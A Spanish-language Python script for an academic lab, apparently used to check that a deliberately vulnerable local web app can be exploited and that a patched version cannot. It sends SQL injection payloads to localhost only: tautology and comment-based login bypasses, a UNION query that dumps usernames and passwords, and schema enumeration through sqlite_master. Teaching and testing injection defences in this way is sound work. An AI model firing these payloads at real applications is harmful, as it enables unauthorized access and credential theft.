"""
ataque_sql_i.py - Pruebas CONTROLADAS de SQL Injection contra el laboratorio.

Uso:
    python ataque_sql_i.py                      # ataca la app vulnerable (5000)
    python ataque_sql_i.py --url http://127.0.0.1:5001   # prueba la app segura

SEGURIDAD / ÉTICA: el script SOLO funciona contra localhost (127.0.0.1) y se
niega a atacar cualquier otro host. Es una herramienta de validación para la
práctica académica; atacar sistemas ajenos sin autorización es ilegal.

Resultado: tabla en consola + archivo resultados_<puerto>.json
"""
import argparse
import json
import sys
from urllib.parse import urlparse

import requests

HOSTS_PERMITIDOS = {"127.0.0.1", "localhost"}

# Cada prueba: (id, descripción, tipo, payload usuario/q, payload password, evidencia de éxito)
PRUEBAS = [
    ("T1", "Login legítimo (control)", "login", "admin", "admin123", "LOGIN EXITOSO"),
    ("T2", "Login con credenciales falsas (control)", "login", "admin", "incorrecta", "LOGIN EXITOSO"),
    ("T3", "Bypass de autenticación: tautología OR 1=1", "login", "admin' OR '1'='1", "x' OR '1'='1", "LOGIN EXITOSO"),
    ("T4", "Bypass por comentario SQL (admin'--)", "login", "admin'--", "cualquiera", "LOGIN EXITOSO"),
    ("T5", "Provocar error SQL (comilla simple)", "login", "'", "x", "Error SQL"),
    ("T6", "Búsqueda legítima (control)", "buscar", "Mouse", "", "Mouse Inalambrico"),
    ("T7", "Extracción UNION: usuarios y contraseñas", "buscar",
     "zzz' UNION SELECT id, username, password, rol FROM usuarios--", "", "admin123"),
    ("T8", "Enumeración de esquema (sqlite_master)", "buscar",
     "zzz' UNION SELECT 1, name, sql, 0 FROM sqlite_master WHERE type='table'--", "", "CREATE TABLE"),
    ("T9", "Volcado total con tautología en búsqueda", "buscar", "' OR 1=1--", "", "Router WiFi 6"),
]


def ejecutar(base, prueba):
    pid, desc, tipo, a, b, evidencia = prueba
    try:
        if tipo == "login":
            r = requests.post(f"{base}/login", data={"username": a, "password": b}, timeout=5)
        else:
            r = requests.get(f"{base}/buscar", params={"q": a}, timeout=5)
    except requests.RequestException as e:
        return {"id": pid, "descripcion": desc, "http": "ERROR", "explotado": False, "detalle": str(e)}

    explotado = evidencia in r.text
    return {
        "id": pid,
        "descripcion": desc,
        "payload": a if tipo == "buscar" else f"user={a} | pass={b}",
        "http": r.status_code,
        "explotado": explotado,
        "evidencia_buscada": evidencia,
    }


def main():
    ap = argparse.ArgumentParser(description="Pruebas SQLi controladas (solo localhost)")
    ap.add_argument("--url", default="http://127.0.0.1:5000")
    args = ap.parse_args()

    u = urlparse(args.url)
    if u.hostname not in HOSTS_PERMITIDOS:
        sys.exit(f"[BLOQUEADO] Solo se permite localhost. Host recibido: {u.hostname}")

    base = args.url.rstrip("/")
    print(f"\n=== Pruebas SQLi contra {base} ===\n")
    resultados = [ejecutar(base, p) for p in PRUEBAS]

    print(f"{'ID':<4} {'HTTP':<5} {'EVIDENCIA ENCONTRADA':<21} DESCRIPCIÓN")
    print("-" * 80)
    for r in resultados:
        marca = "SI" if r["explotado"] else "NO"
        print(f"{r['id']:<4} {str(r['http']):<5} {marca:<21} {r['descripcion']}")

    # T1 y T6 son controles: deben dar SI; T2 debe dar NO. El resto son ataques.
    ataques = [r for r in resultados if r["id"] in ("T3", "T4", "T5", "T7", "T8", "T9")]
    exitosos = sum(r["explotado"] for r in ataques)
    print(f"\nAtaques exitosos: {exitosos}/{len(ataques)}")
    print("=> APLICACIÓN VULNERABLE" if exitosos else "=> Ataques neutralizados (aplicación protegida)")

    nombre = f"resultados_{u.port or 80}.json"
    with open(nombre, "w", encoding="utf-8") as f:
        json.dump(resultados, f, ensure_ascii=False, indent=2)
    print(f"Resultados guardados en {nombre}\n")


if __name__ == "__main__":
    main()
